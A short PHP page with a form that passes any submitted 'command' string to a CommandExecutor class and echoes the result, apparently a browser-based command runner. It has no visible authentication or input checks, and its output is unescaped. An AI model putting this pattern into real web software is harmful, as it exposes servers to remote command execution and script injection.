<?php

require_once "vendor/autoload.php"; 

use App\SessionManager;
use App\CommandExecutor;

session_set_cookie_params(0);
SessionManager::start();

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $input = $_POST["command"] ?? "";
    $output = CommandExecutor::execute($input);
    echo "<pre>$output</pre>";
}
?>

<form method="post">
    <input type="text" name="command" placeholder="Enter the command" required autofocus>
    <button type="submit">Execute</button>
</form>